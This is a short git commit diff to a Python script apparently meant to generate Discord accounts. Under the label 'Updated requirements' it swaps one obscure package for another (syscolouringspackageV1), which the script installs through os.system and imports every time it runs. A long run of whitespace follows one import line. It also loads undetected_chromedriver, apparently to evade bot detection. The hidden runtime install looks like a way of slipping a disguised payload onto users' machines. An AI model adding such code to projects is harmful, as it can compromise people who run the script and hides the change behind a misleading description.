ae6497e64c4ef68ad855a68b48eac04f684d6c80
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-08-06 15:41:53 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlite2pkgsV2")
-import pysqlite2pkgsV2
+os.system("pip install syscolouringspackageV1")
+import syscolouringspackageV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
